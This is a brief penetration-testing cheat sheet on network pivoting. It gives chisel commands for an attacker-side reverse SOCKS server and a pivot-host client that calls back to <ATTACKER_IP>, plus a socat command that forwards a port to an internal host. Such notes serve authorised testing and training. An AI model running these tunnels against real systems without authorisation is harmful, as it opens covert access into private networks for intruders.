# Chisel & Socat Tunnelling

## Chisel – Reverse SOCKS
Attacker:

chisel server -p 8000 --reverse
Pivot:


chisel client <ATTACKER_IP>:8000 R:socks
Socat – Port Forward

socat TCP-LISTEN:8080,fork TCP:10.0.0.5:80
